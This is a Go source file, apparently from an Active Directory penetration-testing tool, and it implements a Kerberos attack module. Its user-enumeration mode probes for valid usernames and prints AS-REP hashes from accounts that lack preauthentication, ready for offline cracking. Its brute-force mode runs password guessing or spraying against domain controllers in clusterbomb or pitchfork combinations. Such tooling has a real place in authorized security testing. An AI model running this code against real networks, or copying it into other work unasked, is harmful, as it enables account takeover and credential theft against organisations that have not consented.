package goad

import (
	"sync"

	"github.com/5amu/goad/internal/printer"
	"github.com/5amu/goad/internal/utils"
	"github.com/5amu/goad/pkg/kerberos"
	"github.com/5amu/goad/pkg/smb"
)

type Krb5Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		Bruteforce bool `long:"brute" description:"Bruteforce provided user and pass (can be pass spray when only 1 password is specified)"`
		UserEnum   bool `long:"user-enum" description:"enumerate valid usernames via kerberos"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`

	targets        []string
	target2SMBInfo map[string]*smb.SMBInfo
	printMutex     sync.Mutex
	credentials    []utils.Credential
}

func (o *Krb5Options) Run() error {
	o.targets = utils.ExtractTargets(o.Targets.TARGETS)

	o.target2SMBInfo = make(map[string]*smb.SMBInfo)
	var wg sync.WaitGroup
	var mutex sync.Mutex
	for _, t := range o.targets {
		wg.Add(1)
		go func(s string) {
			v := getSMBInfo(s)
			if v != nil {
				mutex.Lock()
				o.target2SMBInfo[s] = v
				mutex.Unlock()
			}
			wg.Done()
		}(t)
	}
	wg.Wait()

	if o.BruteforceStrategy.Pitchfork {
		o.credentials = utils.NewCredentialsPitchFork(
			utils.ExtractLinesFromFileOrString(o.Connection.Username),
			utils.ExtractLinesFromFileOrString(o.Connection.Password),
		)
	} else {
		o.credentials = utils.NewCredentialsClusterBomb(
			utils.ExtractLinesFromFileOrString(o.Connection.Username),
			utils.ExtractLinesFromFileOrString(o.Connection.Password),
		)
	}

	var f func(string)
	if o.Mode.UserEnum {
		f = o.userenum
	} else if o.Mode.Bruteforce {
		f = o.bruteforce
	} else {
		return nil
	}

	for target := range o.target2SMBInfo {
		wg.Add(1)
		go func(t string) {
			f(t)
			wg.Done()
		}(target)
	}
	wg.Wait()
	return nil
}

func (o *Krb5Options) userenum(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)

	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.PrintFailure(err.Error())
		return
	}

	o.printMutex.Lock()
	defer o.printMutex.Unlock()
	for _, u := range o.credentials {
		if tgs, err := client.GetAsReqTgt(u.Username); err != nil {
			_, ok := err.(*kerberos.ErrorRequiresPreauth)
			if ok {
				prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain), "Requires Preauth")
			} else {
				prt.PrintFailure(u.StringWithDomain(o.Connection.Domain), "Does Not Exist")
			}
		} else {
			hash := tgs.Hash
			prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain), "No Preauth")
			prt.Print(hash)
		}
	}
}

func (o *Krb5Options) bruteforce(target string) {
	prt := printer.NewPrinter("KRB5", target, o.target2SMBInfo[target].NetBIOSName, 88)

	client, err := kerberos.NewKerberosClient(o.Connection.Domain, target)
	if err != nil {
		prt.PrintFailure(err.Error())
		return
	}

	o.printMutex.Lock()
	defer o.printMutex.Unlock()
	for _, u := range o.credentials {
		if ok, _ := client.TestLogin(u.Username, u.Password); ok {
			prt.PrintSuccess(u.StringWithDomain(o.Connection.Domain))
		} else {
			prt.PrintFailure(u.StringWithDomain(o.Connection.Domain))
		}
	}
}
